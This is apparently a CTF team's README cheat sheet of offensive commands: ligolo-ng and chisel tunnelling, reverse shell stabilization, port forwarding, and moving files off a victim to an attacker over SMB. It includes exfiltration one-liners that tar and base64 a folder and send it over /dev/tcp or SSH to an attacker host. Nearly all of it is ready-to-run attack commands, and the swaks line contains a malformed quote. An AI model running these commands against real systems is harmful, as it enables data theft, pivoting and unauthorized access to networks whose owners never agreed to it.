# purplestorm-TTPs

A collection of commands, tools, techniques and procedures of the purplestorm ctf team.

## Table of Contents

- [Tooling](#tooling)
  - [Swaks](#swaks)
  - [Ligolo-ng](#ligolo-ng)
- [Stabilizing Linux shell](#stabilizing-linux-shell)
- [Exfiltrating Data](#exfiltrating-data)
- [Port forwarding](#port-forwarding-1)
- [Transfering files](#transfering-files)
- [Sliver](Sliver.md)
## Tooling

### Swaks

- [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)

```c
swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
```

### Ligolo-ng

- [https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

### Prepare Tunnel Interface

```c
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```c
$ sudo ip link set ligolo up
```

### Setup Proxy on Attacker Machine

```c
$ ./proxy -laddr <LHOST>:443 -selfcert
```

### Setup Agent on Target Machine

```c
$ ./agent -connect <LHOST>:443 -ignore-cert
```

### Configure Session

```c
ligolo-ng » session
```

```c
[Agent : user@target] » ifconfig
```

```c
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```c
[Agent : user@target] » start
```

### Port Forwarding

```c
[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
```


## Stabilizing Linux shell
```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset
screen
```

## Exfiltrating Data
### via TCP socket, ebcdic and base64
On kali:
```
nc -nlvp 80 > datafolder.tmp
```
On target:
```
tar zcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/10.10.10.10/80
```
On kali:
```
dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar
tar xf datafolder.tar
```
### via SSH
On target:
```
tar zcf - /tmp/datafolder | ssh root@<attacker_ip> "cd /tmp; tar zxpf -"
```
On kali:
```
cd /tmp/datafolder
```

## Port forwarding
### SSH:
On kali:
```
ssh -N -L 80:localhost:80 user@10.10.10.10 -C
```
### Chisel:
```
./chisel server -p 8000 --reverse #Server -- Attacker
./chisel client 10.10.16.3:8000 R:100:172.17.0.1:100 #Client -- Victim
```
### Socat:
On victim:
```
socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
```

## Transfering files
### Windows
via SMB server(from victim to attacker):
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username user -password pass share . -smb2support  # On kali
net use \\10.10.16.5\share /u:user pass   # On victim
copy C:\Users\user\Desktop\somefile.txt \\10.10.16.5\share\somefile.txt   # On victim
```
